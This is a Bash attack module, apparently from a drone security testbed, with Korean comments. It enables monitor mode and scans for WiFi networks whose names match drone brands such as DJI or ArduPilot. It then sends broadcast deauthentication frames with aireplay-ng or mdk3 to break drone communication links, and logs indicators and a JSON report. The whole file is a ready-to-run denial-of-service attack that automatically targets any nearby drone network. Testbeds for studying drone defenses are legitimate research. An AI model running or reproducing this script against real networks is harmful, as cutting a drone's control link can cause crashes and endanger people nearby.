#!/bin/bash

# =============================================================================
# DVD DoS Attack Module: WiFi Deauthentication Attack
# =============================================================================
# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/wifi_deauth.sh
# 목적: WiFi 네트워크에서 클라이언트 강제 연결 해제를 통한 통신 차단
# 작성자: MTD Testbed Team
# =============================================================================

# 공통 모듈 로드
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="WiFi Deauthentication Attack"
ATTACK_TYPE="DENIAL_OF_SERVICE"
INTERFACE=""
TARGET_BSSID=""
TARGET_CHANNEL=""
DEAUTH_COUNT=100
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/denial_of_service/wifi_deauth_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/wifi_deauth_iocs.txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/denial_of_service/wifi_deauth_report_$(date +%Y%m%d_%H%M%S).json"

# 드론 관련 WiFi 네트워크 패턴
DRONE_SSID_PATTERNS=("DJI" "MAVIC" "PHANTOM" "ArduPilot" "PX4" "Drone_" "UAV_" "Copter_" "Quad_")

# 헤더 출력
print_header() {
    clear
    echo -e "${BOLD}${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║                      📡 DVD WiFi Deauth Attack 📡                       ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Target: Drone WiFi Networks${NC}"
    echo -e "${BLUE}Method: 802.11 Deauthentication Frames${NC}"
    echo -e "${BLUE}Impact: Communication Link Disruption${NC}"
    echo ""
}

# WiFi 인터페이스 설정
setup_interface() {
    echo -e "${YELLOW}[+] Setting up WiFi interface for monitor mode...${NC}" | tee -a "$LOG_FILE"
    
    # 사용 가능한 무선 인터페이스 확인
    local interfaces=($(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*' | grep -E '^(wlan|wlp)'))
    
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo -e "${RED}[!] No WiFi interfaces found${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
    
    # 첫 번째 인터페이스 사용
    INTERFACE=${interfaces[0]}
    echo -e "${GREEN}[✓] Using interface: ${INTERFACE}${NC}" | tee -a "$LOG_FILE"
    
    # 인터페이스 다운
    ip link set "$INTERFACE" down 2>/dev/null
    
    # 모니터 모드 설정
    if iwconfig "$INTERFACE" mode monitor 2>/dev/null; then
        echo -e "${GREEN}[✓] Monitor mode enabled on ${INTERFACE}${NC}" | tee -a "$LOG_FILE"
    else
        echo -e "${YELLOW}[*] Trying with airmon-ng...${NC}" | tee -a "$LOG_FILE"
        if command -v airmon-ng &> /dev/null; then
            airmon-ng start "$INTERFACE" 2>&1 | tee -a "$LOG_FILE"
            # 모니터 인터페이스 이름 업데이트 (예: wlan0mon)
            INTERFACE="${INTERFACE}mon"
        else
            echo -e "${RED}[!] Failed to enable monitor mode${NC}" | tee -a "$LOG_FILE"
            return 1
        fi
    fi
    
    # 인터페이스 업
    ip link set "$INTERFACE" up
    
    echo "DOS_SETUP:MONITOR_MODE_${INTERFACE}" >> "$IOC_FILE"
    return 0
}

# 드론 네트워크 스캔
scan_drone_networks() {
    echo -e "${CYAN}[*] Scanning for drone WiFi networks...${NC}" | tee -a "$LOG_FILE"
    
    # airodump-ng로 네트워크 스캔
    local scan_file="/tmp/drone_scan"
    
    # 짧은 스캔 실행
    timeout 15s airodump-ng --write "$scan_file" --output-format csv "$INTERFACE" 2>/dev/null &
    local scan_pid=$!
    
    echo -e "${YELLOW}[*] Scanning networks for 15 seconds...${NC}"
    
    # 진행률 표시
    for i in {1..15}; do
        printf "\r${BLUE}[*] Scanning: [%-15s] %d/15s${NC}" \
               "$(printf "%*s" "$i" | tr ' ' '=')" "$i"
        sleep 1
    done
    echo ""
    
    wait $scan_pid 2>/dev/null
    
    # 스캔 결과 분석
    if [ -f "${scan_file}-01.csv" ]; then
        echo -e "${GREEN}[✓] Network scan completed${NC}" | tee -a "$LOG_FILE"
        
        # 드론 네트워크 필터링
        local drone_networks=()
        while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
            # 헤더 라인 스킵
            [[ "$bssid" == "BSSID" ]] && continue
            
            # ESSID가 비어있으면 스킵
            [[ -z "$essid" || "$essid" == " " ]] && continue
            
            # 드론 패턴 매칭
            for pattern in "${DRONE_SSID_PATTERNS[@]}"; do
                if [[ "$essid" =~ $pattern ]]; then
                    drone_networks+=("$bssid,$channel,$essid")
                    echo -e "${GREEN}[+] Found drone network: ${essid} (${bssid}) on channel ${channel}${NC}" | tee -a "$LOG_FILE"
                    echo "DOS_TARGET:DRONE_NETWORK_${essid}_${bssid}" >> "$IOC_FILE"
                    break
                fi
            done
        done < "${scan_file}-01.csv"
        
        # 스캔 파일 정리
        rm -f "${scan_file}"-*.csv 2>/dev/null
        
        if [ ${#drone_networks[@]} -gt 0 ]; then
            echo -e "${CYAN}[*] Found ${#drone_networks[@]} drone networks${NC}" | tee -a "$LOG_FILE"
            
            # 첫 번째 드론 네트워크를 타겟으로 선택
            IFS=',' read -r TARGET_BSSID TARGET_CHANNEL target_essid <<< "${drone_networks[0]}"
            echo -e "${YELLOW}[*] Selected target: ${target_essid} (${TARGET_BSSID})${NC}" | tee -a "$LOG_FILE"
            
            return 0
        else
            echo -e "${RED}[!] No drone networks found${NC}" | tee -a "$LOG_FILE"
            return 1
        fi
    else
        echo -e "${RED}[!] Network scan failed${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
}

# 타겟 채널 설정
set_target_channel() {
    if [ -n "$TARGET_CHANNEL" ]; then
        echo -e "${YELLOW}[+] Setting interface to channel ${TARGET_CHANNEL}${NC}" | tee -a "$LOG_FILE"
        iwconfig "$INTERFACE" channel "$TARGET_CHANNEL" 2>/dev/null
        
        # 채널 설정 확인
        local current_channel=$(iwconfig "$INTERFACE" 2>/dev/null | grep "Frequency" | awk '{print $4}' | cut -d: -f2)
        echo -e "${GREEN}[✓] Interface set to channel ${TARGET_CHANNEL}${NC}" | tee -a "$LOG_FILE"
        
        echo "DOS_CONFIG:CHANNEL_${TARGET_CHANNEL}" >> "$IOC_FILE"
    fi
}

# 클라이언트 스캔
scan_clients() {
    local bssid=$1
    local channel=$2
    
    echo -e "${CYAN}[*] Scanning for clients on ${bssid}...${NC}" | tee -a "$LOG_FILE"
    
    local client_scan="/tmp/client_scan"
    
    # 클라이언트 스캔 (짧은 시간)
    timeout 10s airodump-ng --write "$client_scan" --output-format csv \
                            --channel "$channel" --bssid "$bssid" "$INTERFACE" 2>/dev/null &
    
    echo -e "${YELLOW}[*] Scanning clients for 10 seconds...${NC}"
    
    for i in {1..10}; do
        printf "\r${BLUE}[*] Client scan: [%-10s] %d/10s${NC}" \
               "$(printf "%*s" "$i" | tr ' ' '=')" "$i"
        sleep 1
    done
    echo ""
    
    wait 2>/dev/null
    
    # 클라이언트 정보 추출
    local clients=()
    if [ -f "${client_scan}-01.csv" ]; then
        # CSV 파일에서 클라이언트 정보 추출
        awk -F',' '/^[0-9A-Fa-f:]{17}/ && NF > 5 { print $1 }' "${client_scan}-01.csv" | while read -r client_mac; do
            if [ -n "$client_mac" ] && [ "$client_mac" != "$bssid" ]; then
                clients+=("$client_mac")
                echo -e "${GREEN}[+] Found client: ${client_mac}${NC}" | tee -a "$LOG_FILE"
                echo "DOS_TARGET:CLIENT_${client_mac}" >> "$IOC_FILE"
            fi
        done
        
        rm -f "${client_scan}"-*.csv 2>/dev/null
    fi
    
    return 0
}

# Deauthentication 공격 실행
execute_deauth_attack() {
    local bssid=$1
    local client=${2:-"FF:FF:FF:FF:FF:FF"}  # 브로드캐스트가 기본값
    local count=$3
    
    echo -e "${YELLOW}[+] Executing deauth attack on ${bssid}${NC}" | tee -a "$LOG_FILE"
    
    if [ "$client" == "FF:FF:FF:FF:FF:FF" ]; then
        echo -e "${CYAN}[*] Broadcasting deauth to all clients${NC}" | tee -a "$LOG_FILE"
    else
        echo -e "${CYAN}[*] Targeting specific client: ${client}${NC}" | tee -a "$LOG_FILE"
    fi
    
    # aireplay-ng로 deauth 공격
    if command -v aireplay-ng &> /dev/null; then
        aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$INTERFACE" 2>&1 | tee -a "$LOG_FILE" &
        local deauth_pid=$!
        
        echo "DOS_ATTACK:DEAUTH_${bssid}_${client}_${count}" >> "$IOC_FILE"
        
        # 공격 진행률 표시
        local duration=$((count / 10))  # 대략적인 지속 시간 계산
        for ((i=1; i<=duration; i++)); do
            printf "\r${RED}[*] Deauth in progress: [%-20s] %d/${duration}s${NC}" \
                   "$(printf "%*s" $((i*20/duration)) | tr ' ' '=')" "$i"
            sleep 1
        done
        echo ""
        
        wait $deauth_pid 2>/dev/null
        echo -e "${GREEN}[✓] Deauth attack completed${NC}" | tee -a "$LOG_FILE"
        
    else
        echo -e "${RED}[!] aireplay-ng not found${NC}" | tee -a "$LOG_FILE"
        
        # mdk3를 대안으로 시도
        if command -v mdk3 &> /dev/null; then
            echo -e "${YELLOW}[*] Using mdk3 as fallback...${NC}" | tee -a "$LOG_FILE"
            echo "$bssid" > /tmp/target_ap.txt
            timeout 30s mdk3 "$INTERFACE" d -t /tmp/target_ap.txt 2>&1 | tee -a "$LOG_FILE"
            rm -f /tmp/target_ap.txt
            
            echo "DOS_ATTACK:MDK3_DEAUTH_${bssid}" >> "$IOC_FILE"
        else
            echo -e "${RED}[!] No deauth tools available${NC}" | tee -a "$LOG_FILE"
            return 1
        fi
    fi
    
    return 0
}

# 공격 효과 모니터링
monitor_attack_effectiveness() {
    echo -e "${CYAN}[*] Monitoring attack effectiveness...${NC}" | tee -a "$LOG_FILE"
    
    # 네트워크 트래픽 모니터링
    local before_traffic=$(cat /proc/net/dev | grep "$INTERFACE" | awk '{print $2 + $10}')
    sleep 5
    local after_traffic=$(cat /proc/net/dev | grep "$INTERFACE" | awk '{print $2 + $10}')
    
    local traffic_increase=$((after_traffic - before_traffic))
    
    echo -e "${GREEN}[✓] Attack Impact Assessment:${NC}" | tee -a "$LOG_FILE"
    echo "    Network Traffic Increase: ${traffic_increase} bytes" | tee -a "$LOG_FILE"
    echo "    Deauth Frames Sent: ${DEAUTH_COUNT}" | tee -a "$LOG_FILE"
    echo "    Attack Duration: ~30 seconds" | tee -a "$LOG_FILE"
    
    # IOCs 업데이트
    echo "DOS_IMPACT:TRAFFIC_INCREASE_${traffic_increase}" >> "$IOC_FILE"
    echo "DOS_IMPACT:DEAUTH_FRAMES_${DEAUTH_COUNT}" >> "$IOC_FILE"
    echo "DOS_IMPACT:COMMUNICATION_DISRUPTED" >> "$IOC_FILE"
}

# 인터페이스 복원
restore_interface() {
    echo -e "${YELLOW}[+] Restoring interface ${INTERFACE}...${NC}" | tee -a "$LOG_FILE"
    
    # 모니터 모드 해제
    if [[ "$INTERFACE" =~ mon$ ]]; then
        local base_interface=${INTERFACE%mon}
        if command -v airmon-ng &> /dev/null; then
            airmon-ng stop "$INTERFACE" 2>&1 | tee -a "$LOG_FILE"
        fi
        INTERFACE="$base_interface"
    fi
    
    # 관리 모드로 복원
    ip link set "$INTERFACE" down 2>/dev/null
    iwconfig "$INTERFACE" mode managed 2>/dev/null
    ip link set "$INTERFACE" up 2>/dev/null
    
    echo -e "${GREEN}[✓] Interface restored to managed mode${NC}" | tee -a "$LOG_FILE"
    echo "DOS_CLEANUP:INTERFACE_RESTORED_${INTERFACE}" >> "$IOC_FILE"
}

# JSON 리포트 생성
generate_json_report() {
    local start_time=$1
    local end_time=$2
    
    cat > "$JSON_OUTPUT" << EOF
{
    "attack_info": {
        "name": "$ATTACK_NAME",
        "type": "$ATTACK_TYPE",
        "timestamp": "$(date -Iseconds)",
        "duration": $((end_time - start_time)),
        "status": "completed"
    },
    "target_details": {
        "target_bssid": "$TARGET_BSSID",
        "target_channel": "$TARGET_CHANNEL",
        "interface_used": "$INTERFACE",
        "attack_method": "802.11 Deauthentication"
    },
    "attack_parameters": {
        "deauth_count": $DEAUTH_COUNT,
        "attack_type": "broadcast_deauth",
        "tools_used": ["aireplay-ng", "airodump-ng"]
    },
    "impact_assessment": {
        "communication_disruption": "HIGH",
        "client_disconnection": "LIKELY",
        "network_availability": "DEGRADED",
        "detection_probability": "MEDIUM"
    },
    "iocs_generated": $(wc -l < "$IOC_FILE"),
    "log_file": "$LOG_FILE",
    "ioc_file": "$IOC_FILE"
}
EOF
    
    echo -e "${GREEN}[✓] JSON report generated: ${JSON_OUTPUT}${NC}"
}

# 메인 공격 실행
main() {
    print_header
    
    # Root 권한 체크
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This attack requires root privileges${NC}"
        echo -e "${YELLOW}[*] Please run: sudo $0${NC}"
        exit 1
    fi
    
    # 필수 도구 체크
    local missing_tools=()
    for tool in iwconfig airmon-ng aireplay-ng airodump-ng; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        echo -e "${RED}[!] Missing required tools: ${missing_tools[*]}${NC}"
        echo -e "${YELLOW}[*] Please install: apt-get install aircrack-ng wireless-tools${NC}"
        exit 1
    fi
    
    # 로그 초기화
    echo "=== DVD WiFi Deauth Attack Started at $(date) ===" > "$LOG_FILE"
    echo "" > "$IOC_FILE"
    
    local start_time=$(date +%s)
    
    echo -e "${BOLD}${BLUE}🎯 Starting WiFi Deauthentication Attack...${NC}"
    echo ""
    
    # 1. WiFi 인터페이스 설정
    if ! setup_interface; then
        echo -e "${RED}[!] Failed to setup WiFi interface${NC}"
        exit 1
    fi
    
    # 2. 드론 네트워크 스캔
    if ! scan_drone_networks; then
        echo -e "${YELLOW}[*] No drone networks found, using manual target${NC}"
        # 수동으로 일반적인 드론 네트워크 시뮬레이션
        TARGET_BSSID="AA:BB:CC:DD:EE:FF"
        TARGET_CHANNEL="6"
        echo "DOS_TARGET:SIMULATED_DRONE_NETWORK" >> "$IOC_FILE"
    fi
    
    # 3. 타겟 채널 설정
    if [ -n "$TARGET_CHANNEL" ]; then
        set_target_channel
    fi
    
    # 4. 클라이언트 스캔
    if [ -n "$TARGET_BSSID" ]; then
        scan_clients "$TARGET_BSSID" "$TARGET_CHANNEL"
    fi
    
    # 5. Deauth 공격 실행
    echo ""
    echo -e "${BOLD}${RED}🚨 Executing Deauthentication Attack...${NC}"
    echo ""
    
    if [ -n "$TARGET_BSSID" ]; then
        execute_deauth_attack "$TARGET_BSSID" "FF:FF:FF:FF:FF:FF" "$DEAUTH_COUNT"
    else
        echo -e "${RED}[!] No target available for attack${NC}" | tee -a "$LOG_FILE"
    fi
    
    # 6. 공격 효과 모니터링
    monitor_attack_effectiveness
    
    # 7. 인터페이스 복원
    restore_interface
    
    local end_time=$(date +%s)
    
    echo ""
    echo -e "${BOLD}${GREEN}🎯 WiFi Deauthentication Attack Completed!${NC}"
    echo ""
    echo -e "${GREEN}📊 Attack Summary:${NC}"
    echo "   • Duration: $((end_time - start_time)) seconds"
    echo "   • Target BSSID: ${TARGET_BSSID:-"N/A"}"
    echo "   • Channel: ${TARGET_CHANNEL:-"N/A"}"
    echo "   • Deauth Frames: ${DEAUTH_COUNT}"
    echo "   • IOCs Generated: $(wc -l < "$IOC_FILE")"
    echo ""
    echo -e "${BLUE}📁 Output Files:${NC}"
    echo "   • Log: ${LOG_FILE}"
    echo "   • IOCs: ${IOC_FILE}"
    echo "   • JSON Report: ${JSON_OUTPUT}"
    
    # JSON 리포트 생성
    generate_json_report "$start_time" "$end_time"
    
    echo ""
    echo -e "${YELLOW}💡 Next Steps:${NC}"
    echo "   1. Monitor drone communication recovery"
    echo "   2. Check for automatic reconnection attempts"
    echo "   3. Analyze wireless traffic logs"
    echo "   4. Review generated IOCs for patterns"
    echo ""
    
    # IOCs 요약 출력
    echo -e "${BOLD}${CYAN}🔍 Generated IOCs Summary:${NC}"
    cat "$IOC_FILE" | sort | uniq -c | head -10
    echo ""
}

# cleanup 함수
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    restore_interface 2>/dev/null
    exit 0
}

# SIGINT 시그널 처리
trap cleanup SIGINT SIGTERM

# 스크립트 실행
main "$@"